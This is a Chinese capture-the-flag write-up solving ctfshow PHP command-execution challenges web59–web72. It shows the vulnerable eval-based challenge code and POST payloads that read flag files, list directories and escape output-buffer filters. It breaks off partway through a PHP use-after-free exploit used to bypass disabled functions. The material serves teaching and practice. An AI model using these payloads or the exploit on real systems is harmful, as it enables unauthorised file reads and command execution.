<p>payload:(POST传参)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c=echo file_get_contents(&#34;flag.php&#34;);
</span></span></code></pre></td></tr></table>
</div>
</div><p>(记得查看网站源码来获取flag)</p>
<blockquote>
<p>web59/60/61/62/63/64/65/67</p>
<p>要注意有些题目的flag文件在根目录，有些是在网站目录</p>
<p>payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">c</span><span class="o">=</span><span class="n">echo</span> <span class="n">file_get_contents</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">=</span><span class="n">readfile</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">=</span><span class="n">var_dump</span><span class="p">(</span><span class="n">file</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">=</span><span class="n">highlight_file</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">=</span><span class="n">show_source</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">=$</span><span class="n">a</span><span class="o">=</span><span class="n">fopen</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">);</span><span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">feof</span><span class="p">(</span><span class="o">$</span><span class="n">a</span><span class="p">))</span> <span class="p">{</span><span class="o">$</span><span class="n">line</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="o">$</span><span class="n">a</span><span class="p">);</span><span class="n">echo</span> <span class="o">$</span><span class="n">line</span><span class="p">;}</span><span class="c1">#一行一行读取</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">=$</span><span class="n">a</span><span class="o">=</span><span class="n">fopen</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">);</span><span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">feof</span><span class="p">(</span><span class="o">$</span><span class="n">a</span><span class="p">))</span> <span class="p">{</span><span class="o">$</span><span class="n">line</span> <span class="o">=</span> <span class="n">fgetc</span><span class="p">(</span><span class="o">$</span><span class="n">a</span><span class="p">);</span><span class="n">echo</span> <span class="o">$</span><span class="n">line</span><span class="p">;}</span><span class="c1">#一行一个一个字符取</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">=$</span><span class="n">a</span><span class="o">=</span><span class="n">fopen</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">);</span><span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">feof</span><span class="p">(</span><span class="o">$</span><span class="n">a</span><span class="p">))</span> <span class="p">{</span><span class="o">$</span><span class="n">line</span> <span class="o">=</span> <span class="n">fgetcsv</span><span class="p">(</span><span class="o">$</span><span class="n">a</span><span class="p">);</span><span class="n">var_dump</span><span class="p">(</span><span class="o">$</span><span class="n">line</span><span class="p">);}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><a href="https://blog.csdn.net/m0_62207170/article/details/129902182" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/m0_62207170/article/details/129902182</a></p>
</blockquote>
<p>[web59]跟58一模一样的题</p>
<h3 id="web66" class="headerLink">
    <a href="#web66" class="header-mark"></a>[web66]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>前端显示出来的代码长得跟前面一样，但过滤了很多函数，尝试了前面的payload都行不通</p>
<p>先查看根目录内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c=print_r(scandir(&#34;/&#34;));
</span></span></code></pre></td></tr></table>
</div>
</div><p>或者可以用</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">c</span><span class="o">=</span><span class="n">var_dump</span><span class="p">(</span><span class="n">scandir</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以看到根目录下的flag.txt文件，随后</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c=highlight_file(&#34;/flag.txt&#34;);
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web68" class="headerLink">
    <a href="#web68" class="header-mark"></a>[web68]</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707123323147.png" title="image-20230707123323147" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707123323147.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707123323147.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707123323147.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707123323147.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707123323147.png 2x"
            sizes="auto"
            alt="image-20230707123323147">
    </a></figure></p>
<p>直接禁用了highlight_file函数，显示根目录文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">c</span><span class="o">=</span><span class="n">var_dump</span><span class="p">(</span><span class="n">scandir</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后直接</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c=include(&#39;/flag.txt&#39;);
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web69" class="headerLink">
    <a href="#web69" class="header-mark"></a>[web69]</h3><p>尝试<code>c=include('index.php');</code>发现字节太大了</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707124155302.png" title="image-20230707124155302" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707124155302.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707124155302.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707124155302.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707124155302.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707124155302.png 2x"
            sizes="auto"
            alt="image-20230707124155302">
    </a></figure></p>
<p>直接尝试include flag.txt，成功了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c=include(&#39;/flag.txt&#39;);
</span></span></code></pre></td></tr></table>
</div>
</div><p>web70类似</p>
<h3 id="web71" class="headerLink">
    <a href="#web71" class="header-mark"></a>[web71]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$s</span> <span class="o">=</span> <span class="nx">ob_get_contents</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nx">ob_end_clean</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[0-9]|[a-z]/i&#34;</span><span class="p">,</span><span class="s2">&#34;?&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">你要上天吗？
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>源码劫持了输出缓冲并且将数字和字母替换成了<code>?</code></p>
<blockquote>
<p>ob_get_contents — 返回输出缓冲区的内容
ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</p>
</blockquote>
<p><strong>题解1：</strong></p>
<p>在劫持输出缓冲区之前就把缓冲区送出，可以用的函数有：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ob_flush();
</span></span><span class="line"><span class="cl">ob_end_flush();
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c=include(&#39;/flag.txt&#39;);ob_flush();
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>题解2：</strong></p>
<p>提前终止程序，即执行完代码直接退出，可以调用的函数有：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">exit();
</span></span><span class="line"><span class="cl">die();
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c=include(&#39;/flag.txt&#39;);exit();
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web72" class="headerLink">
    <a href="#web72" class="header-mark"></a>[web72]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$s</span> <span class="o">=</span> <span class="nx">ob_get_contents</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nx">ob_end_clean</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[0-9]|[a-z]/i&#34;</span><span class="p">,</span><span class="s2">&#34;?&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">你要上天吗？
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>查看源代码， 用glob协议读取根目录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="cp">?&gt;</span><span class="err">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="err">$a=new DirectoryIterator(&#34;glob:///*&#34;);
</span></span></span><span class="line"><span class="cl"><span class="err">foreach($a as $f)
</span></span></span><span class="line"><span class="cl"><span class="err">{echo($f-&gt;__toString().&#39; &#39;);
</span></span></span><span class="line"><span class="cl"><span class="err">} 
</span></span></span><span class="line"><span class="cl"><span class="err">exit(0);
</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>用<strong>uaf脚本</strong>命令执行,并url编码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c=function ctfshow($cmd) {
</span></span><span class="line"><span class="cl">    global $abc, $helper, $backtrace;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    class Vuln {
</span></span><span class="line"><span class="cl">        public $a;
</span></span><span class="line"><span class="cl">        public function __destruct() {
</span></span><span class="line"><span class="cl">            global $backtrace;
</span></span><span class="line"><span class="cl">            unset($this-&gt;a);
</span></span><span class="line"><span class="cl">            $backtrace = (new Exception)-&gt;getTrace();
</span></span><span class="line"><span class="cl">            if(!isset($backtrace[1][&#39;args&#39;])) {
</span></span><span class="line"><span class="cl">                $backtrace = debug_backtrace();
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    class Helper {
</span></span><span class="line"><span class="cl">        public $a, $b, $c, $d;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    function str2ptr(&amp;$str, $p = 0, $s = 8) {
</span></span><span class="line"><span class="cl">        $address = 0;
</span></span><span class="line"><span class="cl">        for($j = $s-1; $j &gt;= 0; $j--) {
</span></span><span class="line"><span class="cl">            $address &lt;&lt;= 8;
</span></span><span class="line"><span class="cl">            $address |= ord($str[$p+$j]);
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">        return $address;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    function ptr2str($ptr, $m = 8) {
</span></span><span class="line"><span class="cl">        $out = &#34;&#34;;
</span></span><span class="line"><span class="cl">        for ($i=0; $i &lt; $m; $i++) {
</span></span><span class="line"><span class="cl">            $out .= sprintf(&#34;%c&#34;,($ptr &amp; 0xff));
</span></span><span class="line"><span class="cl">            $ptr &gt;&gt;= 8;
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">        return $out;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    function write(&amp;$str, $p, $v, $n = 8) {
</span></span><span class="line"><span class="cl">        $i = 0;
</span></span><span class="line"><span class="cl">        for($i = 0; $i &lt; $n; $i++) {
